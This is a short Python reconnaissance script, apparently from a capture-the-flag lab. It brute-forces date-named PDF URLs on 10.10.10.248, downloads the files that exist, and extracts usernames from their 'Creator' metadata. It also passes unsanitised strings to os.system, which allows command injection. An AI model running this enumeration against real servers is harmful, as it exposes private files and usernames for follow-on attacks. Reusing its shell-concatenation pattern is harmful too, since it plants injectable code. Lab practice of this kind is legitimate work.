import requests
import os

def get_users():
    os.system("strings *.pdf | grep -i Creator | awk '{print $2}' | grep -v -i Tex | sed 's/(//' | sed 's/)//' > users.txt")

def get_pedfs(iurl):
    for i in range(0,2):
        for j in range(0,10):
            for k in range(0,4):
                for l in range(0,10):
                    url = iurl + str(i) + str(j) + "-" + str(k) + str(l) + "-upload.pdf"
                    r = requests.get(url)
                    if r.status_code != 404:
                        filename = url.rsplit('/',1)[1] 
                        download = "curl " + url + " -o " + filename
                        os.system(download)
                    else:
                        continue

    get_users()

def main():
    iurl = "http://10.10.10.248/documents/2020-"
    get_pedfs(iurl)

if __name__ == "__main__":
    main()